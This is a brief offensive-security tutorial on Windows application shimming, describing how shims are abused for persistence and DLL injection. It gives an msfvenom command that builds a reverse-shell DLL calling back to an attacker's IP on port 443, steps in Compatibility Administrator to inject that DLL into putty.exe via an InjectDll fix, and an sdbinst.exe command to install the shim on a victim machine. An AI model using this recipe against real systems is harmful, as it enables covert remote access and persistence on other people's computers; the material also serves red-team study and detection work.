# Application Shimming

Application Shimming is a malicious technique on Microsoft Windows operating systems in which Application Shim's are abused to establish persistence, inject DLLs, elevate privileges .
will be abused to inject a malicious payload into putty.exe process, which will connect back to our attacking machine.

download 
https://docs.microsoft.com/en-us/windows-hardware/get-started/what-s-new-in-kits-and-tools

### payload

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.46 LPORT=443 -f dll > nss.dll
```

### create custome db

1. run compatibility Adminstrator fro start Menu
2. Database --> Create New --> Application Fix
3. Name : putty Name of the vendor : NooraNet Program file location : putty.exe
4. select injectdll in compatibilty fixes windows go to parameters tab add 
5. add dll path in command line 

### Run shim sdb on victim

```
sdbinst.exe nss.sdb
```
